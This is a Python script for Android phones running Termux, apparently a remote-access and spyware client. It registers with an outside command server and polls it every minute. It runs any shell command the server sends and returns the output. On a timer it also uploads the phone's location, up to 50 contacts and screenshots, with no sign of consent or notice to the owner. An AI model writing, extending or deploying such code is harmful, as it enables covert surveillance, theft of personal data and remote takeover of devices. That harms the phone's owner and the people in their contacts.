import requests
import time
import sys
import argparse
import subprocess
import json
import base64
import os
from datetime import datetime

class RealDataAgent:
    def __init__(self, agent_id, server_url):
        self.agent_id = agent_id
        self.server_url = server_url
        self.session = requests.Session()
        
    def register_with_server(self):
        """Register this real device with the server"""
        try:
            # Get actual device information
            device_info = self.get_actual_device_info()
            
            response = self.session.post(f"{self.server_url}/api/agent/register", json={
                'agent_id': self.agent_id,
                'phone_model': device_info.get('phone_model', 'Real Android Device'),
                'android_version': device_info.get('android_version', 'Real Android OS')
            }, timeout=30)
            
            if response.status_code == 200:
                print("✅ Registered with server as REAL device")
                return True
            else:
                print(f"❌ Registration failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"❌ Registration error: {e}")
            return False
    
    def get_actual_device_info(self):
        """Get REAL device information - no fake data"""
        device_info = {}
        
        try:
            # Try to get actual device model
            result = subprocess.run(['getprop', 'ro.product.model'], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                device_info['phone_model'] = result.stdout.strip()
            
            # Try to get actual Android version
            result = subprocess.run(['getprop', 'ro.build.version.release'], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                device_info['android_version'] = result.stdout.strip()
                
        except Exception as e:
            print(f"⚠️  Could not get device info: {e}")
        
        return device_info
    
    def get_actual_battery_info(self):
        """Get REAL battery information"""
        try:
            # Try to get battery info from Termux API
            result = subprocess.run(['termux-battery-status'], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                battery_data = json.loads(result.stdout)
                return battery_data.get('percentage', 0)
        except Exception as e:
            print(f"⚠️  Could not get battery info: {e}")
        
        return 0
    
    def collect_actual_location(self):
        """Get REAL location if available"""
        try:
            # Try to get location from Termux API
            result = subprocess.run(['termux-location'], 
                                  capture_output=True, text=True, timeout=15)
            if result.returncode == 0:
                location_data = json.loads(result.stdout)
                latitude = location_data.get('latitude')
                longitude = location_data.get('longitude')
                
                if latitude and longitude:
                    return {
                        'latitude': latitude,
                        'longitude': longitude,
                        'accuracy': location_data.get('accuracy', 0),
                        'address': f"Real location: {latitude}, {longitude}"
                    }
        except Exception as e:
            print(f"⚠️  Could not get real location: {e}")
        
        return None
    
    def collect_actual_contacts(self):
        """Get REAL contacts if accessible"""
        contacts = []
        try:
            # Try to get contacts from Termux API
            result = subprocess.run(['termux-contact-list'], 
                                  capture_output=True, text=True, timeout=15)
            if result.returncode == 0:
                contact_data = json.loads(result.stdout)
                for contact in contact_data:
                    name = contact.get('name', '').strip()
                    numbers = contact.get('number', [])
                    if numbers and name:
                        phone = numbers[0] if isinstance(numbers, list) else numbers
                        contacts.append({
                            'name': name,
                            'phone': str(phone)
                        })
                        # Limit to 50 contacts to avoid huge payloads
                        if len(contacts) >= 50:
                            break
        except Exception as e:
            print(f"⚠️  Could not get real contacts: {e}")
        
        return contacts
    
    def capture_actual_screenshot(self):
        """Capture REAL screenshot if possible"""
        try:
            # Try to capture screenshot using Termux API
            result = subprocess.run(['termux-screenshot'], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                # Screenshot saved to file, read and encode it
                screenshot_files = [f for f in os.listdir('.') if f.startswith('screenshot')]
                if screenshot_files:
                    latest_screenshot = max(screenshot_files, key=os.path.getctime)
                    with open(latest_screenshot, 'rb') as f:
                        image_data = f.read()
                    
                    # Clean up
                    os.remove(latest_screenshot)
                    
                    return base64.b64encode(image_data).decode('utf-8')
        except Exception as e:
            print(f"⚠️  Could not capture real screenshot: {e}")
        
        return None
    
    def check_commands(self):
        """Check for pending commands from server"""
        try:
            response = self.session.get(f"{self.server_url}/api/agent/check_commands/{self.agent_id}")
            if response.status_code == 200:
                commands = response.json().get('commands', [])
                for cmd in commands:
                    print(f"📨 Received command: {cmd['command']}")
                    self.execute_command(cmd['id'], cmd['command'])
        except Exception as e:
            print(f"⚠️  Command check failed: {e}")
    
    def execute_command(self, command_id, command):
        """Execute REAL commands and send back ACTUAL results"""
        try:
            result = "Command executed on real device"
            
            if command == 'get_location':
                location = self.collect_actual_location()
                result = f"Real location: {location}" if location else "Real location not available"
                
            elif command == 'get_contacts':
                contacts = self.collect_actual_contacts()
                result = f"Found {len(contacts)} real contacts"
                
            elif command == 'get_screenshot':
                screenshot = self.capture_actual_screenshot()
                result = "Real screenshot captured" if screenshot else "Real screenshot not available"
                
            elif command == 'get_device_info':
                device_info = self.get_actual_device_info()
                battery = self.get_actual_battery_info()
                result = f"Real device: {device_info}, Battery: {battery}%"
                
            elif command.startswith('shell:'):
                # Execute shell command and return REAL output
                shell_cmd = command[6:]
                try:
                    cmd_result = subprocess.run(shell_cmd, shell=True, 
                                              capture_output=True, text=True, timeout=30)
                    result = f"Real command output:\n{cmd_result.stdout}\n{cmd_result.stderr}"
                except Exception as e:
                    result = f"Real command failed: {e}"
            
            # Send command result back to server
            self.session.post(f"{self.server_url}/api/agent/command_result", json={
                'command_id': command_id,
                'result': result
            })
            
        except Exception as e:
            print(f"❌ Command execution failed: {e}")
    
    def send_heartbeat(self):
        """Send heartbeat with REAL device info"""
        try:
            battery_level = self.get_actual_battery_info()
            
            self.session.post(f"{self.server_url}/api/agent/submit_report", json={
                'agent_id': self.agent_id,
                'report_type': 'heartbeat',
                'report_data': {
                    'battery': battery_level
                }
            })
            
            # Occasionally send device info
            if int(time.time()) % 300 == 0:  # Every 5 minutes
                device_info = self.get_actual_device_info()
                self.session.post(f"{self.server_url}/api/agent/submit_report", json={
                    'agent_id': self.agent_id,
                    'report_type': 'device_info',
                    'report_data': {
                        'battery': battery_level,
                        'phone_model': device_info.get('phone_model', 'Real Device'),
                        'android_version': device_info.get('android_version', 'Real OS')
                    }
                })
                
        except Exception as e:
            print(f"⚠️  Heartbeat failed: {e}")
    
    def collect_and_send_data(self):
        """Collect and send REAL data periodically"""
        try:
            # Randomize data collection to make it more realistic
            current_time = int(time.time())
            
            # Location (every 10-15 minutes)
            if current_time % 900 < 60:  # Roughly every 15 minutes
                location = self.collect_actual_location()
                if location:
                    self.session.post(f"{self.server_url}/api/agent/submit_report", json={
                        'agent_id': self.agent_id,
                        'report_type': 'location',
                        'report_data': location
                    })
            
            # Contacts (once per hour)
            if current_time % 3600 < 60:
                contacts = self.collect_actual_contacts()
                if contacts:
                    self.session.post(f"{self.server_url}/api/agent/submit_report", json={
                        'agent_id': self.agent_id,
                        'report_type': 'contacts',
                        'report_data': {'contacts': contacts}
                    })
            
            # Screenshot (every 20-30 minutes)
            if current_time % 1800 < 60:
                screenshot = self.capture_actual_screenshot()
                if screenshot:
                    self.session.post(f"{self.server_url}/api/agent/submit_report", json={
                        'agent_id': self.agent_id,
                        'report_type': 'screenshot',
                        'report_data': {'image_data': f"data:image/jpeg;base64,{screenshot}"}
                    })
                    
        except Exception as e:
            print(f"⚠️  Data collection failed: {e}")
    
    def run(self):
        """Main agent loop - ONLY REAL DATA"""
        print(f"🤖 REAL DATA AGENT STARTED: {self.agent_id}")
        print("📊 Collecting ACTUAL device data only")
        print("🚫 No fake data will be generated")
        
        if not self.register_with_server():
            print("❌ Failed to register with server")
            return
        
        iteration = 0
        while True:
            try:
                iteration += 1
                print(f"🔄 Agent iteration {iteration} - Collecting REAL data...")
                
                # Check for commands
                self.check_commands()
                
                # Send heartbeat
                self.send_heartbeat()
                
                # Collect and send real data
                self.collect_and_send_data()
                
                # Wait before next iteration
                time.sleep(60)  # Check every minute
                
            except KeyboardInterrupt:
                print("🛑 Agent stopped by user")
                break
            except Exception as e:
                print(f"⚠️  Agent error: {e}")
                time.sleep(30)  # Wait before retrying

def main():
    parser = argparse.ArgumentParser(description='MP Real Data Agent')
    parser.add_argument('--agent-id', required=True, help='Real Agent ID')
    parser.add_argument('--server', required=True, help='Server URL')
    args = parser.parse_args()
    
    agent = RealDataAgent(args.agent_id, args.server)
    agent.run()

if __name__ == '__main__':
    main()